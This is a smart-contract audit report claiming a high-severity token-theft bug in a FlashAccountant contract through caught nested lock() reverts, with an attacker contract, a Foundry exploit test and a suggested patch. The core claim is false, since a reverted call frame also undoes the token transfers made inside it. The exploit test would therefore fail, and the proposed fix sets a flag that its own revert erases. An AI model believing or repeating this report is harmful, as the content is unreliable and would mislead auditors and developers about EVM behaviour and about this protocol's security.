## Title
Nested Lock Revert Bypass Allows Token Theft Through Transient Storage Rollback

## Summary
An attacker can exploit the mismatch between transient storage rollback behavior and external token transfer finality in the `FlashAccountant` contract. By making a nested `lock()` call with a low-level call that catches reverts, an attacker can withdraw tokens during the inner lock, let it revert due to unpaid debts, and keep the withdrawn tokens while the debt accounting is rolled back in transient storage.

## Impact
**Severity**: High

## Finding Description

**Location:** `src/base/FlashAccountant.sol` - `lock()` function (lines 146-187) and `withdraw()` function (lines 322-381) [1](#0-0) [2](#0-1) 

**Intended Logic:** The flash accounting system should guarantee all-or-nothing settlement - either all debts are repaid and the lock completes successfully, or the entire lock reverts and no tokens are withdrawn. The `lock()` function checks that all debts are zeroed (lines 175-181) before completion, and if not, it reverts with `DebtsNotZeroed`.

**Actual Logic:** When a nested lock reverts, transient storage changes (debt tracking via TSTORE) are rolled back by the EVM, but external token transfers that already occurred are NOT rolled back. An attacker can exploit this by:
1. Making a low-level call to create a nested lock (without bubbling up reverts)
2. Withdrawing tokens in the nested lock (tokens are transferred out at lines 350 or 361)
3. Letting the nested lock revert at the debt check (line 176-181)
4. Catching the revert in the outer lock
5. The debt is rolled back but tokens remain withdrawn

**Exploitation Path:**
1. Attacker contract calls `ACCOUNTANT.lock()` directly (not through BaseLocker which auto-bubbles reverts)
2. In the `locked_6416899205(0)` callback, attacker makes a LOW-LEVEL CALL to `ACCOUNTANT.lock()` again using assembly `call()` without reverting on failure
3. In the inner `locked_6416899205(1)` callback, attacker calls `ACCOUNTANT.withdraw()` to withdraw tokens (e.g., 100 ETH)
4. The `withdraw()` function updates debt in transient storage (line 342: `tstore(deltaSlot, next)`) and then transfers tokens (lines 350 or 361)
5. Inner callback returns without repaying the debt
6. Inner `lock()` checks `nonzeroDebtCount[1]` (line 175), finds it non-zero, and reverts (lines 176-181)
7. Attacker's low-level call returns false (caught), outer callback continues
8. Due to EVM transient storage revert semantics, all TSTORE operations in the inner lock are rolled back, including the debt increase at line 342
9. However, the token transfer (external call to recipient or token contract) is NOT rolled back - tokens are permanently transferred
10. Attacker settles any legitimate outer lock debts (if any) and completes successfully

**Security Property Broken:** Violates the Flash Accounting invariant: "All flash loans must be repaid within the same transaction with proper accounting." The inner lock's flash loan was NOT repaid, yet the transaction succeeded.

## Impact Explanation

- **Affected Assets**: All tokens held by the FlashAccountant contract, including ETH (via native token address) and any ERC20 tokens
- **Damage Severity**: Complete drainage of the FlashAccountant contract balance. An attacker can withdraw the entire balance up to `type(uint128).max` per nested lock call. With multiple nested locks in a single transaction, an attacker can drain arbitrary amounts.
- **User Impact**: All users are affected as the protocol becomes insolvent. Legitimate users who have deposited funds or have pending settlements will be unable to withdraw their assets.

## Likelihood Explanation

- **Attacker Profile**: Any unprivileged user who can deploy a contract with a malicious `locked_6416899205` implementation
- **Preconditions**: FlashAccountant contract must have a non-zero balance of tokens (which is the normal operating state)
- **Execution Complexity**: Single transaction with nested lock calls. Requires only a simple malicious contract that uses low-level call to catch reverts.
- **Frequency**: Can be exploited repeatedly until all funds are drained. Each transaction can steal up to `type(uint128).max` worth of tokens per nested lock level.

## Recommendation

The root cause is that the protocol allows catching reverts from `lock()` calls without enforcement. The fix should ensure that if a nested lock reverts, the entire transaction must revert (cannot be caught).

**Option 1: Add a reentrancy guard that prevents nested locks from being caught**

```solidity
// In src/base/FlashAccountant.sol, add state variable:
bool private _lockReverted;

// In lock() function, after line 169 (in the revert handler):
if iszero(success) {
    // Set flag that this lock reverted
    tstore(_LOCK_REVERTED_SLOT, 1)
    
    returndatacopy(free, 0, returndatasize())
    revert(free, returndatasize())
}

// In lock() function, before line 172 (after successful callback):
// Check if any nested lock reverted and was caught
if tload(_LOCK_REVERTED_SLOT) {
    // A nested lock reverted but was caught - this is an attack
    mstore(0x00, 0x12345678) // NestedLockRevertCaught()
    revert(0x1c, 4)
}
```

**Option 2: Force immediate revert on debt check failure before callback returns**

Move the debt check INSIDE the callback context by having the callback check its own debts before returning, making it impossible to catch the revert externally. However, this would require protocol-wide refactoring.

**Option 3: Document that only trusted wrapper contracts (like BaseLocker) should be used**

This is not a sufficient fix as the protocol is permissionless and any user can call `lock()` directly.

**Recommended Fix: Option 1** - Add detection for caught nested lock reverts using a transient storage flag.

## Proof of Concept

```solidity
// File: test/Exploit_NestedLockTheft.t.sol
// Run with: forge test --match-test test_NestedLockTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/interfaces/IFlashAccountant.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";

contract AttackerContract {
    IFlashAccountant public accountant;
    address public recipient;
    bool public isInnerLock;
    uint256 public stolenAmount;
    
    constructor(IFlashAccountant _accountant, address _recipient) {
        accountant = _accountant;
        recipient = _recipient;
    }
    
    function exploit() external {
        isInnerLock = false;
        // Call lock() to start outer lock
        accountant.lock();
    }
    
    function locked_6416899205(uint256 id) external {
        if (!isInnerLock && id == 0) {
            // Outer lock - make a low-level call to nested lock
            isInnerLock = true;
            
            // Low-level call that catches revert
            (bool success,) = address(accountant).call(
                abi.encodeWithSelector(IFlashAccountant.lock.selector)
            );
            
            // Success should be false because inner lock reverts
            // But we caught it, so we continue
            require(!success, "Inner lock should have reverted");
            
            // Outer lock continues normally (no debts to settle)
        } else if (isInnerLock && id == 1) {
            // Inner lock - withdraw tokens WITHOUT repaying
            stolenAmount = 100 ether;
            
            // Encode withdraw calldata: token, recipient, amount
            bytes memory withdrawData = abi.encodePacked(
                NATIVE_TOKEN_ADDRESS,
                recipient,
                uint128(stolenAmount)
            );
            
            // Call withdraw with packed calldata
            (bool success,) = address(accountant).call(
                abi.encodePacked(
                    IFlashAccountant.withdraw.selector,
                    withdrawData
                )
            );
            require(success, "Withdraw failed");
            
            // DON'T repay the debt - let this lock revert
            // The revert will be caught by outer lock
        }
    }
}

contract Exploit_NestedLockTheft is Test {
    Core public core;
    AttackerContract public attacker;
    address public recipient = address(0xBEEF);
    
    function setUp() public {
        core = new Core();
        attacker = new AttackerContract(IFlashAccountant(address(core)), recipient);
        
        // Fund the core contract (simulating normal protocol operation)
        vm.deal(address(core), 1000 ether);
    }
    
    function test_NestedLockTheft() public {
        uint256 recipientBalanceBefore = recipient.balance;
        uint256 coreBalanceBefore = address(core).balance;
        
        // EXPLOIT: Execute the attack
        attacker.exploit();
        
        uint256 recipientBalanceAfter = recipient.balance;
        uint256 coreBalanceAfter = address(core).balance;
        
        // VERIFY: Tokens were stolen
        assertEq(
            recipientBalanceAfter - recipientBalanceBefore,
            100 ether,
            "Vulnerability confirmed: Attacker stole 100 ETH"
        );
        
        assertEq(
            coreBalanceBefore - coreBalanceAfter,
            100 ether,
            "Core lost 100 ETH"
        );
        
        assertEq(
            attacker.stolenAmount(),
            100 ether,
            "Stolen amount recorded"
        );
    }
}
```

**Notes:**
- The vulnerability stems from the fundamental mismatch between transient storage (which reverts) and external state changes (which don't revert when caught)
- The protocol assumes all callers will use `BaseLocker.lock()` which properly bubbles up reverts, but there's no enforcement of this assumption
- An attacker can bypass this by calling `FlashAccountant.lock()` directly with custom revert handling
- The `withdraw()` function comment at line 345-347 mentions reentrancy safety but doesn't address the revert catching vulnerability [3](#0-2)

### Citations

**File:** src/base/FlashAccountant.sol (L146-187)
```text
    function lock() external {
        assembly ("memory-safe") {
            let current := tload(_CURRENT_LOCKER_SLOT)

            let id := shr(160, current)

            // store the count
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, add(id, 1)), caller()))

            let free := mload(0x40)
            // Prepare call to locked_(uint256) -> selector 0
            mstore(free, 0)
            mstore(add(free, 4), id) // ID argument

            calldatacopy(add(free, 36), 4, sub(calldatasize(), 4))

            // Call the original caller with the packed data
            let success := call(gas(), caller(), 0, free, add(calldatasize(), 32), 0, 0)

            // Pass through the error on failure
            if iszero(success) {
                returndatacopy(free, 0, returndatasize())
                revert(free, returndatasize())
            }

            // Undo the "locker" state changes
            tstore(_CURRENT_LOCKER_SLOT, current)

            // Check if something is nonzero
            let nonzeroDebtCount := tload(add(_NONZERO_DEBT_COUNT_OFFSET, id))
            if nonzeroDebtCount {
                // cast sig "DebtsNotZeroed(uint256)"
                mstore(0x00, 0x9731ba37)
                mstore(0x20, id)
                revert(0x1c, 0x24)
            }

            // Directly return whatever the subcall returned
            returndatacopy(free, 0, returndatasize())
            return(free, returndatasize())
        }
    }
```

**File:** src/base/FlashAccountant.sol (L322-381)
```text
    function withdraw() external {
        uint256 id = _requireLocker().id();

        assembly ("memory-safe") {
            let nzdCountChange := 0

            // Process each withdrawal entry
            for { let i := 4 } lt(i, calldatasize()) { i := add(i, 56) } {
                let token := shr(96, calldataload(i))
                let recipient := shr(96, calldataload(add(i, 20)))
                let amount := shr(128, calldataload(add(i, 40)))

                if amount {
                    // Update debt tracking without updating nzdCountSlot yet
                    let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
                    let current := tload(deltaSlot)
                    let next := add(current, amount)

                    nzdCountChange := add(nzdCountChange, sub(iszero(current), iszero(next)))

                    tstore(deltaSlot, next)

                    // Perform the transfer of the withdrawn asset
                    // Note that these calls can re-enter and even relock with the same ID
                    // However the nzdCountChange is always applied as a delta at the end, meaning we load the latest value before updating it,
                    // so it's safe from re-entry
                    switch token
                    case 0 {
                        let success := call(gas(), recipient, amount, 0, 0, 0, 0)
                        if iszero(success) {
                            // cast sig "ETHTransferFailed()"
                            mstore(0x00, 0xb12d13eb)
                            revert(0x1c, 4)
                        }
                    }
                    default {
                        mstore(0x14, recipient)
                        mstore(0x34, amount)
                        mstore(0x00, 0xa9059cbb000000000000000000000000)
                        let success := call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)
                        if iszero(and(eq(mload(0x00), 1), success)) {
                            if iszero(lt(or(iszero(extcodesize(token)), returndatasize()), success)) {
                                mstore(0x00, 0x90b8ec18) // `TransferFailed()`.
                                revert(0x1c, 0x04)
                            }
                        }
                    }
                }
            }

            // Update nzdCountSlot only once if there were any changes
            if nzdCountChange {
                let nzdCountSlot := add(id, _NONZERO_DEBT_COUNT_OFFSET)
                tstore(nzdCountSlot, add(tload(nzdCountSlot), nzdCountChange))
            }

            // we return from assembly so as to prevent solidity from accessing the free memory pointer after we have written into it
            return(0, 0)
        }
    }
```
